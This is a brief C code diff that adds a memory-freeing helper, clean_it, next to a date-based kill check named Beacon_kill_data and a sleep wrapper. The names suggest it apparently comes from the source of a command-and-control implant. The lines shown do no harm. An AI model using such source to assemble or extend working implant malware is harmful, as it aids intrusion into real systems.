@@ -22,7 +22,11 @@ int Beacon_kill_data()
 	GetLocalTime(&SystemTime);
 	return SystemTime.wDay + 100 * (SystemTime.wMonth + 100 * (unsigned int)SystemTime.wYear) >= get_DWORD(40);
 }
-
+void __fastcall clean_it(void* Block)
+{
+	free(*(void**)Block);
+	free(Block);
+}
 
 void call_sleep(DWORD dwMilliseconds)
 {
